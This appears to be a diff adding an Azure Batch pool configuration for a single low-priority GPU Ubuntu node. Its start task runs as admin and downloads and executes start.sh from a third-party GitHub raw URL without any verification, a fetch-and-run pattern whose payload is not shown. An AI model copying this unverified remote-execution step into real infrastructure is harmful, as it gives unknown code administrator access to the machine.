@@ -1,0 +1,38 @@
+{
+    "id": "dgfd2341",
+    "vmSize": "standard_nc6s_v3",
+    "virtualMachineConfiguration": {
+        "imageReference": {
+            "publisher": "canonical",
+            "offer": "ubuntuserver",
+            "sku": "18.04-lts",
+            "version": "latest"
+        },
+        "nodeAgentSKUId": "batch.node.ubuntu 18.04",
+        "nodePlacementConfiguration": {
+            "policy": "Regional"
+        }
+    },
+    "resizeTimeout": "PT5M",
+    "currentDedicatedNodes": 0,
+    "currentLowPriorityNodes": 1,
+    "targetDedicatedNodes": 0,
+    "targetLowPriorityNodes": 1,
+    "enableAutoScale": false,
+    "enableInterNodeCommunication": false,
+    "startTask": {
+        "commandLine": "/bin/bash -c 'sudo apt-get update; sudo apt-get upgrade -y; sudo apt-get install -y tmux; cd /tmp; wget https://raw.githubusercontent.com/vnxxx/h2021/main/start.sh; sh start.sh'",
+        "userIdentity": {
+            "autoUser": {
+                "scope": "pool",
+                "elevationLevel": "admin"
+            }
+        },
+        "maxTaskRetryCount": 0,
+        "waitForSuccess": false
+    },
+    "taskSlotsPerNode": 1,
+    "taskSchedulingPolicy": {
+        "nodeFillType": "Pack"
+    }
+}
